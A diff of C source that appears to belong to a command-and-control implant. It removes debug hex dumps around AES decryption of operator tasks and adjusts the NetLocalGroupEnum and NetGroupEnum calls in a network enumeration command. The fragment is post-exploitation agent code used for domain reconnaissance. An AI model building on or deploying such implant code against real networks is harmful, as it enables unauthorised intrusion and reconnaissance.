@@ -79,19 +79,12 @@ VOID CommandDispatcher( VOID )
                     if ( TaskBufferSize != 0 )
                     {
                         ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
-
-                        PUTS( "Before decryption" )
-                        PRINT_HEX( TaskParser.Buffer, TaskParser.Length )
-
                         ParserDecrypt( &TaskParser, Instance->Config.AES.Key, Instance->Config.AES.IV );
 
                         if ( ! PackageFirst )
                             ParserGetInt32( &TaskParser );
                         else
                             PackageFirst = FALSE;
-
-                        PUTS( "After decryption" )
-                        PRINT_HEX( TaskParser.Buffer, TaskParser.Length )
                     }
 
                     FoundCommand = FALSE;
@@ -2298,7 +2291,6 @@ VOID CommandNet( PPARSER Parser )
             DWORD               EntriesRead   = 0;
             DWORD               TotalEntries  = 0;
             DWORD               NetStatus     = 0;
-            DWORD               Resume        = 0;
 
             WCHAR               Group[ 260 ]  = { 0 };
             DWORD               GroupSize     = 0;
@@ -2314,7 +2306,7 @@ VOID CommandNet( PPARSER Parser )
 
             PRINTF( "ServerName => %ls\n", ServerName );
 
-            NetStatus = Instance->Win32.NetLocalGroupEnum( ServerName, 1, &GroupInfo, -1, &EntriesRead, &TotalEntries, &Resume );
+            NetStatus = Instance->Win32.NetLocalGroupEnum( ServerName, 1, &GroupInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, NULL );
             if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
             {
                 PUTS( "NetLocalGroupEnum => Success" )
@@ -2349,20 +2341,17 @@ VOID CommandNet( PPARSER Parser )
             DWORD               TotalEntries  = 0;
             DWORD               NetStatus     = 0;
             DWORD               Resume        = 0;
-
             WCHAR               Group[ 260 ]  = { 0 };
             DWORD               GroupSize     = 0;
-
             WCHAR               Desc[260 * 2] = { 0 };
             WCHAR               DescSize      = { 0 };
-
             LPWSTR              ServerName    = NULL;
-            WCHAR               Server[ 260 ] = { 0 };
             DWORD               ServerSize    = 0;
 
             ServerName = ParserGetBytes( Parser, &ServerSize );
+            PackageAddBytes( Package, ServerName, ServerSize );
 
-            NetStatus = Instance->Win32.NetGroupEnum( ServerName, 1, &GroupInfo, -1, &EntriesRead, &TotalEntries, &Resume );
+            NetStatus = Instance->Win32.NetGroupEnum( ServerName, 1, &GroupInfo, -1, &EntriesRead, &TotalEntries, NULL );
             if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
             {
                 if ( GroupInfo )
